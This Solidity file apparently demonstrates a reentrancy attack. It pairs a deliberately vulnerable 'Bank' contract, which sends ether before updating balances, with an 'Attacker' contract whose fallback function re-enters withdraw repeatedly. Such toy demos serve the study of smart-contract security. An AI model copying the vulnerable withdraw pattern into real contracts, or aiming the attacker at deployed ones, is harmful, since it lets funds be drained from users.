contract Bank {
    uint private total;
    mapping(address => uint) private balances;

    constructor() public payable {
        total = address(this).balance;
    }

    function getTotal() public view returns(uint,uint) {
        return (total,address(this).balance);
    }
    function getMine() public view returns(uint) {
        return balances[msg.sender];
    }
    function deposit() public payable {
        uint depositAmount = msg.value;
        total += depositAmount;
        balances[msg.sender] = depositAmount;
    }
    function withdraw(uint amount) public {
        require(amount <= balances[msg.sender]);
        // msg.sender.transfer(amount);
        msg.sender.send(amount);
        // msg.sender.call.value(amount)();
        total -= amount;
        balances[msg.sender] -= amount;
    }
}


contract Attacker {
    Bank b;
    uint8 i = 0;

    constructor(address contractAddr) public payable {
        b = Bank(contractAddr);
    }
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function callGetMine() public view returns(uint) {
        return b.getMine();
    }
    function callDeposit() public {
        b.deposit.value(10)();
    }
    function callWithdraw(uint amount) public payable {
        b.withdraw(amount);
    }
    function() public payable {
        require(i<3);
        i++;
        callWithdraw(10);
    }
}
